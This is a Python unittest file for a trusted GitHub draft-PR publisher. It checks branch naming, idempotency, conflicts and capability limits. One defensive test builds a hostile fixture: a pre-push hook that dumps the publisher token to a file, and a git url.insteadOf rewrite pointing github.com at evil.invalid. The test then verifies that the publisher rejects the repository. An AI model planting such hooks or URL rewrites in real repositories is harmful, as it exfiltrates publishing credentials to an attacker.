from __future__ import annotations

import shutil
import subprocess
import unittest
import uuid
from pathlib import Path

from hermes_steward.execution_publisher import (
    PublisherAuthority,
    PublisherAuthorityDenied,
    PublicationConflict,
    StalePublicationAuthority,
    GitHubPublisherGateway,
    SubprocessGit,
    TrustedGitHubPublisher,
    deterministic_branch,
    deterministic_pr_identity,
)
from hermes_steward.prepublication import ChangeSet
from test_execution_adapters import profile, request_for


class InMemoryGitHubGateway:
    def __init__(self):
        self.branches = {}
        self.prs = {}
        self.commits = {}
        self.commit_calls = 0
        self.push_calls = 0
        self.pr_calls = 0
        self.crash_point = None
        self.prepared_commits = {}

    def get_prepared_commit(self, pr_identity):
        return self.prepared_commits.get(pr_identity)

    def get_branch(self, branch):
        return self.branches.get(branch)

    def create_commit(self, workspace, branch, message, metadata):
        del workspace, message
        self.commit_calls += 1
        sha = f"{self.commit_calls:040x}"
        self.commits[sha] = {"branch": branch, **metadata}
        self.prepared_commits[metadata["prIdentity"]] = sha
        if self.crash_point == "AFTER_COMMIT":
            raise RuntimeError("crash after local commit")
        return sha

    def push_task_branch(self, branch, commit_sha, metadata):
        self.push_calls += 1
        self.branches[branch] = {"branch": branch, "commitSha": commit_sha, **metadata}
        if self.crash_point == "AFTER_PUSH":
            raise RuntimeError("crash after push")

    def get_pull_request(self, pr_identity):
        return self.prs.get(pr_identity)

    def create_draft_pull_request(self, branch, base, title, body, metadata):
        self.pr_calls += 1
        value = {
            "number": self.pr_calls,
            "url": f"https://github.com/amengko-stack/sandiva/pull/{self.pr_calls}",
            "isDraft": True,
            "head": branch,
            "base": base,
            "title": title,
            "body": body,
            **metadata,
        }
        self.prs[metadata["prIdentity"]] = value
        if self.crash_point == "AFTER_PR":
            raise RuntimeError("crash after PR creation")
        return value


def changes():
    return ChangeSet(
        changed_paths=("hermes-build-steward/README.md",), patch_digest="1" * 64,
        total_bytes=10, binary_paths=(), generated_paths=(),
    )


class PublisherTests(unittest.TestCase):
    def test_r6_concrete_gateway_verifies_task_branch_and_draft_pr_readback(self):
        """Catches a publisher implementation that exists only as a Protocol."""
        request = request_for(profile("codex"))
        branch = deterministic_branch(request)
        sha = "a" * 40

        class Transport:
            def __init__(self):
                self.branch_exists = False
                self.pr = None
                self.commit_message = None

            def request(self, method, path, body=None):
                if path.startswith("/git/ref/heads/"):
                    return (200, {"object": {"sha": sha}}) if self.branch_exists else (404, {})
                if path == f"/commits/{sha}":
                    return 200, {"sha": sha, "commit": {"message": self.commit_message}}
                if path.startswith("/pulls?"):
                    return 200, ([] if self.pr is None else [self.pr])
                if path == "/pulls" and method == "POST":
                    self.pr = {
                        "number": 85,
                        "html_url": "https://github.com/amengko-stack/sandiva/pull/85",
                        "draft": True,
                        "state": "open",
                        "merged": False,
                        "head": {"ref": body["head"]},
                        "base": {"ref": body["base"]},
                        "body": body["body"],
                    }
                    return 201, self.pr
                raise AssertionError((method, path, body))

        transport = Transport()

        class Git:
            def __init__(self):
                self.message = None

            def run(self, workspace, args, environment=None):
                del workspace, environment
                if args[:2] == ("checkout", "-B") or args == ("add", "-A"):
                    return ""
                if args[:3] == ("commit", "--no-verify", "-m"):
                    self.message = args[3]
                    transport.commit_message = self.message
                    return ""
                if args == ("rev-parse", "HEAD"):
                    return sha
                if args == ("log", "-1", "--format=%B"):
                    return self.message
                if args[:1] == ("push",):
                    transport.branch_exists = True
                    return ""
                raise AssertionError(args)

        gateway = GitHubPublisherGateway(
            "amengko-stack/sandiva", transport=transport, git=Git(),
            credential_provider=lambda: "publisher-sentinel",
            askpass_path="/opt/sandiva/bin/github-askpass",
        )
        record = TrustedGitHubPublisher(gateway).publish_draft(
            request, changes(), "/trusted/workspace", lambda: None
        )

        self.assertEqual(record.branch, branch)
        self.assertEqual(record.commit_sha, sha)
        self.assertTrue(record.draft_pr["isDraft"])
        self.assertEqual(record.draft_pr["number"], 85)

    def test_branch_and_pr_identity_are_deterministic_and_task_bound(self):
        request = request_for(profile("codex"))
        branch = deterministic_branch(request)
        self.assertEqual(branch, deterministic_branch(request))
        self.assertTrue(branch.startswith("build/exec-01-synthetic-001-"))
        self.assertIn(request.task_fingerprint[:12], branch)
        self.assertEqual(
            deterministic_pr_identity(request),
            f"exec-pr:{request.task_id}:{request.task_version}:{request.task_fingerprint}",
        )

    def test_duplicate_publication_reuses_one_commit_branch_and_draft_pr(self):
        request = request_for(profile("codex"))
        gateway = InMemoryGitHubGateway()
        publisher = TrustedGitHubPublisher(gateway)
        checks = []
        first = publisher.publish_draft(request, changes(), "/workspace", lambda: checks.append("current"))
        second = publisher.publish_draft(request, changes(), "/workspace", lambda: checks.append("current"))
        self.assertEqual(first, second)
        self.assertEqual((gateway.commit_calls, gateway.push_calls, gateway.pr_calls), (1, 1, 1))
        self.assertTrue(first.draft_pr["isDraft"])
        self.assertIn(request.specification_hash, first.draft_pr["body"])
        self.assertIn(request.acceptance_contract_hash, first.draft_pr["body"])
        self.assertIn(request.executor_profile_fingerprint, first.draft_pr["body"])
        self.assertGreaterEqual(len(checks), 6)

    def test_conflicting_branch_or_pr_ownership_fails_closed(self):
        request = request_for(profile("codex"))
        branch = deterministic_branch(request)
        pr_identity = deterministic_pr_identity(request)
        cases = (
            ("branch", {branch: {"branch": branch, "commitSha": "2" * 40, "taskFingerprint": "0" * 64}}, {}),
            ("pull request", {}, {pr_identity: {
                "number": 9, "url": "https://github.com/amengko-stack/sandiva/pull/9",
                "isDraft": True, "head": branch, "base": "main", "taskFingerprint": "0" * 64,
                "patchDigest": "1" * 64, "prIdentity": pr_identity,
            }}),
        )
        for label, branches, prs in cases:
            with self.subTest(label=label):
                gateway = InMemoryGitHubGateway()
                gateway.branches.update(branches)
                gateway.prs.update(prs)
                with self.assertRaisesRegex(PublicationConflict, label):
                    TrustedGitHubPublisher(gateway).publish_draft(request, changes(), "/workspace", lambda: None)

    def test_stale_fence_is_revalidated_before_each_privileged_side_effect(self):
        request = request_for(profile("codex"))
        gateway = InMemoryGitHubGateway()
        calls = 0

        def authority():
            nonlocal calls
            calls += 1
            if calls == 3:
                raise StalePublicationAuthority("stale fence")

        with self.assertRaisesRegex(StalePublicationAuthority, "stale fence"):
            TrustedGitHubPublisher(gateway).publish_draft(request, changes(), "/workspace", authority)
        self.assertEqual(gateway.commit_calls, 1)
        self.assertEqual(gateway.push_calls, 0)
        self.assertEqual(gateway.pr_calls, 0)

    def test_publisher_authority_cannot_push_main_merge_deploy_or_administer(self):
        authority = PublisherAuthority()
        for capability in (
            "push_main", "merge", "deploy", "administer_repository", "manage_secrets",
            "manage_environments", "bypass_rulesets",
        ):
            with self.subTest(capability=capability):
                with self.assertRaises(PublisherAuthorityDenied):
                    authority.require(capability)
        for capability in ("create_task_commit", "push_task_branch", "upsert_task_draft_pr", "read_task_metadata"):
            authority.require(capability)

    def test_publisher_object_contains_no_executor_or_publisher_credential(self):
        publisher = TrustedGitHubPublisher(InMemoryGitHubGateway())
        exposed = repr(vars(publisher)).lower()
        self.assertNotIn("credential", exposed)
        self.assertNotIn("token", exposed)

    def test_repository_hook_and_url_rewrite_are_denied_before_credential_bearing_push(self):
        """Catches repository metadata turning the trusted publisher into a credential exfiltration path."""
        root = Path.cwd() / ".test-work" / str(uuid.uuid4())
        workspace = root / "workspace"
        marker = root / "publisher-token.txt"
        workspace.mkdir(parents=True)
        try:
            subprocess.run(["git", "init", "-q", str(workspace)], check=True)
            (workspace / "README.md").write_text("base\n", encoding="utf-8")
            subprocess.run(["git", "-C", str(workspace), "add", "README.md"], check=True)
            subprocess.run([
                "git", "-C", str(workspace), "-c", "user.email=test@sandiva.invalid",
                "-c", "user.name=Sandiva Test", "commit", "-q", "-m", "base",
            ], check=True)
            base_sha = subprocess.check_output(
                ["git", "-C", str(workspace), "rev-parse", "HEAD"], text=True
            ).strip()
            hook = workspace / ".git" / "hooks" / "pre-push"
            hook.write_text(f"#!/bin/sh\nprintf '%s' \"$SANDIVA_GITHUB_PUBLISHER_TOKEN\" > '{marker.as_posix()}'\n", encoding="utf-8")
            subprocess.run([
                "git", "-C", str(workspace), "config", "url.https://evil.invalid/.insteadOf",
                "https://github.com/",
            ], check=True)

            with self.assertRaisesRegex(PublicationConflict, "configuration|hooks"):
                SubprocessGit().assert_safe_repository(str(workspace), base_sha)
            self.assertFalse(marker.exists())
        finally:
            shutil.rmtree(root, ignore_errors=True)


if __name__ == "__main__":
    unittest.main()
